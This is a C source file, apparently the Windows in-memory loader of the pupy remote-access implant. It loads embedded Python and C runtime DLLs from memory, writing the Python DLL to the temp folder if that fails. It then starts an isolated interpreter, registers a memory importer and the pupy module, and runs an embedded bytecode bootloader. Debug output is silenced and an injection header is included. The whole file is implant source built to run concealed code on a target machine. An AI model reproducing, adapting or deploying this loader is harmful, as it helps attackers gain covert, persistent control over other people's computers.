/*
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
*/
#define QUIET // uncomment to avoid debug prints
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "pupy_load.h"
#include "Python-dynload.h"
#include "actctx.h"
#include "resource_python_manifest.c"
#include "base_inject.h"


HANDLE MyActCtx;
static ULONG_PTR actToken;

extern const char resources_python27_dll_start[];
extern const int resources_python27_dll_size;
extern const char resources_bootloader_pyc_start[];
extern const int resources_bootloader_pyc_size;
extern const char resources_msvcr90_dll_start[];
extern const int resources_msvcr90_dll_size;
extern const char resource_python_manifest[];

extern DL_EXPORT(void) init_memimporter(void);
extern DL_EXPORT(void) initpupy(void);

CRITICAL_SECTION csInit; // protecting our init code

// Simple trick to get the current pupy arch
#ifdef _WIN64
	const DWORD dwPupyArch = PROCESS_ARCH_X64;
#else
	const DWORD dwPupyArch = PROCESS_ARCH_X86;
#endif


DWORD WINAPI mainThread(LPVOID lpArg)
{

	int rc = 0;
	PyObject *m=NULL, *d=NULL, *seq=NULL;
	PyObject *mod;
	char * ppath;
	FILE * f;
	char tmp_python_dll_path[MAX_PATH];
	char tmp_manifest_path[MAX_PATH];
	char tmp_path[MAX_PATH];
	ULONG_PTR cookie = 0;
	PyGILState_STATE restore_state;

	if(!GetModuleHandle("msvcr90.dll")){
		#ifndef QUIET
		fprintf(stderr,"loading msvcr90.dll\n");
		#endif
		_load_msvcr90(resources_msvcr90_dll_start);
	}
	else{
		#ifndef QUIET
		fprintf(stderr,"msvcr90.dll already loaded\n");
		#endif
	}

	GetTempPath(MAX_PATH, tmp_path);
	//InitializeCriticalSection(&csInit);

	if(!Py_IsInitialized)
	{
		int res=0;
		//activated = ActivateActCtx(MyActCtx, &actToken);
		//cookie=_My_ActivateActCtx();
		if(GetModuleHandle("python27.dll")){
			HANDLE hp;
			#ifndef QUIET
			fprintf(stderr,"python27.dll is already loaded\n");
			#endif
			_load_python_FromFile("python27.dll"); // does not actually load a new python, but uses the handle of the already loaded one
		}
		else{
			if(!_load_python("python27.dll", resources_python27_dll_start)){
				#ifndef QUIET
				fprintf(stderr,"loading python27.dll from memory failed\n");
				#endif

				//if loading from memory fail, we write dll on disk
				sprintf(tmp_python_dll_path, "%spython27.dll", tmp_path);

				f=fopen(tmp_python_dll_path,"wb");
				res=fwrite(resources_python27_dll_start, sizeof(char), resources_python27_dll_size, f);
				fclose(f);

				if(!_load_python(tmp_python_dll_path, NULL)){
					if(!_load_python("python27.dll", NULL)){ // try loading from system PATH
						#ifndef QUIET
						fprintf(stderr,"could not load python dll\n");
						#endif
					}
				}
			}
		#ifndef QUIET
		fprintf(stderr,"python interpreter loaded\n");
		#endif
		}
		//_My_DeactivateActCtx(cookie);
	}
	#ifndef QUIET
	fprintf(stderr,"calling PyEval_InitThreads() ...\n");
	#endif
	PyEval_InitThreads();
	#ifndef QUIET
	fprintf(stderr,"PyEval_InitThreads() called\n");
	#endif
	if(!Py_IsInitialized()){
		ppath = Py_GetPath();
		strcpy(ppath, "\x00");

		Py_IgnoreEnvironmentFlag = 1;
		Py_NoSiteFlag = 1; /* remove site.py auto import */
		Py_Initialize();

		#ifndef QUIET
		fprintf(stderr,"Py_Initialize()\n");
		#endif
		PySys_SetObject("frozen", PyBool_FromLong(1));
	}
	restore_state=PyGILState_Ensure();

	init_memimporter();
	#ifndef QUIET
	fprintf(stderr,"init_memimporter()\n");
	#endif
	initpupy();
	#ifndef QUIET
	fprintf(stderr,"initpupy()\n");
	#endif


	/* We execute then in the context of '__main__' */
	#ifndef QUIET
	fprintf(stderr,"starting evaluating python code ...\n");
	#endif
	//PyRun_SimpleString("print 'ok from python'");
	m = PyImport_AddModule("__main__");
	if (m) d = PyModule_GetDict(m);
	if (d) seq = PyMarshal_ReadObjectFromString(resources_bootloader_pyc_start, resources_bootloader_pyc_size);
	if (seq) {
		Py_ssize_t i, max = PySequence_Length(seq);
		for (i=0;i<max;i++) {
			PyObject *sub = PySequence_GetItem(seq, i);
			if (seq) {
				PyObject *discard = PyEval_EvalCode((PyCodeObject *)sub, d, d);
				if (!discard) {
					PyErr_Print();
					rc = 255;
				}
				Py_XDECREF(discard);
				/* keep going even if we fail */
			}
			Py_XDECREF(sub);
		}
	}
	PyGILState_Release(restore_state);
	//if (PyErr_Occurred())
	//   PyErr_Print();
	Py_Finalize();
	//DeleteCriticalSection(&csInit);

	return 0;
}

